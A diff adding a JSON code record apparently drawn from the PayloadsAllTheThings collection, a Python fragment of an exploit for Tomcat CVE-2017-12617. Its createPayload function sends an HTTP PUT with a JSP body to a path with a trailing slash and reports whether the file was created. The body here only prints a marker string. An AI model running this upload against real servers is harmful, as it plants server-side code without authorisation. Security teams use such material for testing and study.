@@ -1,0 +1,7 @@
+{
+    "code": "def createPayload(url,f):\n    evil='<% out.println(\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");%>'\n    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}\n    req=requests.put(str(url)+str(f)+\"/\",data=evil, headers=headers)\n    if req.status_code==201:\n        print(\"File Created ..\")",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Tomcat CVE-2017-12617.py",
+    "license": "MIT",
+    "language": "python"
+}
